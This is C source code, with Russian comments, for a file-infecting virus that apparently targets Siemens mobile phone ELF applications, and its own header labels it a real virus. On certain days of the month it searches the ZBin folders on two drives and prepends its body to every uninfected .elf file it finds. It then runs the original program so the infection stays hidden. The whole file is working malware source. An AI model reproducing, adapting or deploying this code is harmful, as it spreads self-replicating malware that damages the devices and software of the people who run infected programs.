
// Вирус эльф 0.5 (c)bn
// Настоящий вирус
// версия 0.4
// не заражает демоны
// по 100 кб за раз, по дням: 4,7,9,13,15,16,20,24,26,30

#include "..\swilib.h"

extern long elfload(char *filename, void *param1, void *param2, void *param3, int fin, int off);
  
void ElfKiller(void){
extern void *ELF_BEGIN;
((void (*)(void *))(mfree_adr()))(&ELF_BEGIN);
}

// Сюда размер вирус эльфа должен быть кратен 4!  ПОМЕНЯТЬ!!!
#define bodysize 4096
char cbn[bodysize]; 

#define bufsize 64
char temp[128], path[128], buf[bufsize];
char oe[8];//="4:\\ZBin";//!!!!
unsigned int err;
int m=100000;

void Rst7(){ // Заражение файла temp
  int f, memsize;
  char *mem;
  if((f=fopen(temp,A_ReadWrite+A_BIN+A_Append,P_READ+P_WRITE,&err))>0){
  lseek(f,0,0,&err,&err);
  fread(f,buf,bufsize,&err);
  if(*(int*)(buf+0x38)!=0xe52de004){ // Не заражен  0x34 было?
  memsize=lseek(f,0,2,&err,&err);
  m-=memsize;
  if(mem=(char*)malloc(memsize)){
    lseek(f,0,0,&err,&err);
    fread(f,mem,memsize,&err);
    lseek(f,0,0,&err,&err);
    fwrite(f,cbn,bodysize,&err);
    fwrite(f,mem,memsize,&err);
  }
  }
  fclose(f,&err);
  }
}

void aa(char *dir){ // Найти все эльфы в dir (использ.temp)
  static DIR_ENTRY de;
  char *ptr;
  strcpy(temp,dir);
  ptr=temp+strlen(temp)+1;
  strcat(temp,"\\*.elf");  
  if (FindFirstFile(&de,temp,&err)){
    do{
      strcpy(ptr,de.file_name);
      Rst7();
    }while(m>0 && FindNextFile(&de,&err));
  }
  FindClose(&de,&err); 
}

void a(char *dir){ // Найти все пути в dir (использ.path)
  static DIR_ENTRY de;
  char *ptr;
  strcpy(path,dir);
  aa(path);
  ptr=path+strlen(path)+1;
  strcat(path,"\\*.*");  
  if (FindFirstFile(&de,path,&err)){
    do{
      strcpy(ptr,de.file_name);
      if(isdir(path,&err) && ((*(int*)(path+8))|0x20202020)!=0x6d656164) //!daem
        aa(path);
    }while(m>0 && FindNextFile(&de,&err));
  }
  FindClose(&de,&err);
}


int main(char *exename, char *fname){
  int f;
  TDate date;
  TTime time;
  GetDateTime(&date,&time);
  if((f=fopen(exename,A_ReadOnly+A_BIN,P_READ,&err))>0){
//    if(date.month!=11 && (exename[strlen(exename)-5]|0x20)=='s' || !(date.day&3)){ //не нояб tetris. || 4й день
 //   if(time.hour&1)
    switch(date.day){
    case 4: case 7: case 9: case 13: case 15: 
    case 16: case 20: case 24: case 26: case 30:
      fread(f,cbn,bodysize,&err);
      *(int*)oe=0x5a5c3a34; // 4:\\Zbin
      *(int*)(oe+4)=0x6e6942; //0x6e695a  zzin
      a((char*)oe);
      *(char*)oe='0';
      a((char*)oe);
    }
   elfload(exename,fname,0,0, f, bodysize);
  }
  SUBPROC((void *)ElfKiller);
  return 0;
}
